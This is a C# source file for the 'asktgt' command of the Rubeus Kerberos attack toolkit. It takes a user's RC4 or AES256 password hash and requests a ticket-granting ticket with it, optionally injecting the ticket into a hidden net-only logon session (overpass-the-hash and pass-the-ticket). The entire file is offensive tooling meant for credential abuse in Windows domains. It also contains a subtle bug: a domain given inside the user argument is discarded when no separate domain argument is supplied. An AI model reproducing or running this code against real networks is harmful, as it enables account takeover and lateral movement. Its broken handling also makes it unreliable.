using System;
using System.Collections.Generic;
using System.Net.NetworkInformation;

namespace Rubeus.Commands
{
    public class Asktgt : ICommand
    {
        public static string CommandName => "asktgt";

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = "";
            uint luid = 0;

            string domain;
            string userValue;
            if (arguments.TryGetValue("/user", out userValue)) {
                string[] parts = userValue.Split('\\');
                switch (parts.Length) {
                    case 1:
                        user = userValue;
                        break;
                    case 2:
                        domain = parts[0];
                        user = parts[1];
                        break;
                    default:
                        Console.WriteLine("\r\n[X] Invalid user value syntax.\r\n");
                        return;
                }
            }
            // TODO : Clarify in source code for overlap with composite user name.
            if (!arguments.TryGetValue("/domain", out domain)) {
                domain = string.Empty;
            }
            string dc;
            if (!arguments.TryGetValue("/dc", out dc)) {
                dc = string.Empty;
            }
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
            string hash;
            if (arguments.TryGetValue("/rc4", out hash)) {
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.TryGetValue("/aes256", out hash)) {
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            if (string.IsNullOrEmpty(hash)) {
                Console.WriteLine("\r\n[X] You must supply a /rc4 or /aes256 hash!\r\n");
                return;
            }

            bool ptt = arguments.ContainsKey("/ptt");
            string luidValue;
            if (arguments.TryGetValue("/luid", out luidValue)) {
                try {
                    luid = uint.Parse(luidValue);
                }
                catch {
                    try {
                        luid = Convert.ToUInt32(luidValue, 16);
                    }
                    catch {
                        Console.WriteLine("[X] Invalid LUID format ({0})\r\n", luidValue);
                        return;
                    }
                }
            }

            string createnetonlyValue;
            if (arguments.TryGetValue("/createnetonly", out createnetonlyValue)) {
                // if we're starting a hidden process to apply the ticket to
                if (!Helpers.IsHighIntegrity()) {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to created logon session");
                    return;
                }
                luid = LSA.CreateProcessNetOnly(createnetonlyValue, arguments.ContainsKey("/show"));
                Console.WriteLine();
            }
            if (string.IsNullOrEmpty(user)) {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (string.IsNullOrEmpty(domain)) {
                domain = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (!((encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1))) {
                Console.WriteLine("\r\n[X] Only /rc4 and /aes256 are supported at this time.\r\n");
                return;
            }
            Ask.TGT(user, domain, hash, encType, ptt, dc, luid);
            return;
        }
    }
}